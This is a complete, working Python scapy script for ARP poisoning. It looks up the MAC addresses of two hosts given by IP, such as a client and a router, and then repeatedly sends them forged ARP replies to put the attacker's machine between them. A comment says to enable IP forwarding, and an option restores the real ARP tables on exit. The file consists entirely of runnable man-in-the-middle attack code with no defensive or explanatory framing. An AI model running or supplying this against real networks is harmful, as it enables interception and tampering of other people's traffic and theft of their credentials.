#!/usr/bin/env python2
# -*- coding: utf-8 -*-

# IP Foward (Arch Linux)
# sysctl net.ipv4.ip_forward=1

import time
import argparse

from scapy.all import *


def poisoning(opts):
    alice_ip = opts.alice
    bob_ip = opts.bob

    resp = srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=alice_ip))
    alice_mac = resp[ARP].hwsrc

    resp = srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=bob_ip))
    bob_mac = resp[ARP].hwsrc

    im_bob = ARP(op=2, psrc=bob_ip, hwdst=alice_mac, pdst=alice_ip)
    im_alice = ARP(op=2, psrc=alice_ip,  hwdst=bob_mac, pdst=bob_ip)

    try:
        while True:
            send(im_bob)
            send(im_alice)

            time.sleep(opts.time)

    except KeyboardInterrupt:
        if opts.restore:
            print("Restoring")
            send(ARP(
                op=2,
                hwsrc=bob_mac, psrc=bob_ip, hwdst=alice_mac, pdst=alice_ip)
                )

            send(ARP(
                op=2,
                hwsrc=alice_mac, psrc=alice_ip, hwdst=bob_mac, pdst=bob_ip)
                )

        print("Finish")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
            description="ARP Poisoning",
            usage="$ arp_poisoning.py -a 192.168.0.100 -b 192.168.0.1")

    parser.add_argument("-a", "--alice", required=True, help="Alice's IP Address")
    parser.add_argument("-b", "--bob", required=True, help="Bob's IP Address")
    parser.add_argument("-t", "--time", type=int, default=5, help="Interval")
    parser.add_argument("-r", "--restore", action="store_true")

    args = parser.parse_args()

    poisoning(args)
